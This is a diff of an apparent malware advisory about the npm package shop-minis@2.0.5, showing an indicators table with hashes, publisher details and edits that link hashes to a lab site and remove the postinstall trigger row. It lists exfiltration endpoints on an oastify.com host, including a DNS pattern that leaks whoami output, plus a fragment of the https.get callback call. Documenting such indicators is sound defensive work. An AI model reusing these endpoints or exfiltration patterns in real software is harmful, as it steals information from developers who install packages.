@@ -55,10 +55,9 @@ https.<span class="tok-fn">get</span>({ host: CALLBACK_HOST, path, timeout: <spa
 | Package | `shop-minis@2.0.5` (npm) |
 | npm page | [npmjs.com/package/shop-minis](https://www.npmjs.com/package/shop-minis) |
 | Published | `2026-05-26T12:06:21Z` |
-| Tarball SHA-256 | `4be8db89785114ce9919d6d822f8363725890fa6cc2fa567a5fd73ee72854016` |
+| Tarball SHA-256 | [`4be8db89785114ce9919d6d822f8363725890fa6cc2fa567a5fd73ee72854016`](https://lab.atomdrift.org/file/4be8db89785114ce9919d6d822f8363725890fa6cc2fa567a5fd73ee72854016) |
 | Tarball SHA-1 (npm `shasum`) | `f556b4533e1bcc01f0a1bc5f7af50eba85ad4303` |
-| `postinstall.js` SHA-256 | `7fc4ea8b86c27e4111b2dc03ad327de9dc80ee686f0443edc0171645f46f6bbb` |
-| Trigger | `postinstall` (`node postinstall.js`) and `bin: discovery-build` |
+| `postinstall.js` SHA-256 | [`7fc4ea8b86c27e4111b2dc03ad327de9dc80ee686f0443edc0171645f46f6bbb`](https://lab.atomdrift.org/file/7fc4ea8b86c27e4111b2dc03ad327de9dc80ee686f0443edc0171645f46f6bbb) |
 | HTTPS exfil | `https://svr57aylqme3zald4p0psi1hw827q1eq.oastify.com/shopify?…` |
 | DNS exfil | `<whoami>.svr57aylqme3zald4p0psi1hw827q1eq.oastify.com` |
 | Publisher | `lobo_hunt <practiceextraone@gmail.com>` |
